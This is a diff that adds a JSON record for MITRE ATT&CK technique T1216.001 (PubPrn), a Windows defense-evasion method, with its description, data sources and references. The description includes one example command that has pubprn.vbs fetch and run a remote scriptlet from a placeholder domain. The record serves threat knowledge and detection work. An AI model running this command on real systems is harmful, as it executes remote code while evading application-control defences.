@@ -1,0 +1,37 @@
+[
+  {
+    "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
+    "platform": "windows",
+    "tid": "T1216.001",
+    "technique": "PubPrn",
+    "tactic": "defense-evasion",
+    "datasources": "command-execution|process-creation|script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
+    "technique_references": [
+      {
+        "source_name": "pubprn",
+        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn",
+        "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma0x3 PubPrn Bypass",
+        "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
+        "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  }
+]
